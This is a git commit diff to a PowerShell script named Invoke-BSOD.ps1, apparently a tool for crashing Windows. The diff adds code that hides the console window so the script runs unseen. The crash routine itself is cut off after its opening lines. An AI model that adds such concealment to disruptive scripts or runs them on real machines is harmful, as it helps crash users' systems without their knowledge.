bb92a899944e3c0226923b8aaa1282b02ab413c5
Jonny Banana <azazaelisback@gmail.com>
2019-03-24 05:33:59 +0100

    Update Invoke-BSOD.ps1

--- PowerShell-Script/Invoke-BSOD.ps1
+++ PowerShell-Script/Invoke-BSOD.ps1
@@ -1,3 +1,19 @@
+# .Net methods for hiding/showing the console in the background
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+function Hide-Console
+{
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+    #0 hide
+    [Console.Window]::ShowWindow($consolePtr, 0)
+}
+Hide-Console
+
+
 function Invoke-BSOD {
 $s = @"
 using System;
